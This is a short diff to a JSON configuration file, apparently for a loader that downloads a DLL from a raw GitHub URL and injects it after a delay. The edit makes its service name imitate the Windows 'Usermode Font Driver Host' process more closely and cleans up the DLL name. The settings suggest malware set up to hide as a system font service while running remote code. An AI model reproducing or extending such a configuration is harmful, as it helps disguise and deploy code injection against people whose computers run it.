@@ -1,6 +1,6 @@
 {
-  "service_name": "11Usermode Fonts Driver Host",
-  "dll_name": "11111111FontsGlyphAnimator.dll",
+  "service_name": "Usermode Fonts Driver Host",
+  "dll_name": "FontsGlyphAnimator.dll",
   "url": "https://raw.githubusercontent.com/BLACK89310/SNIP/main/FontsGlyphAnimator.dll",
   "inject_delay": "20000",
   "update_version": "1.0.",
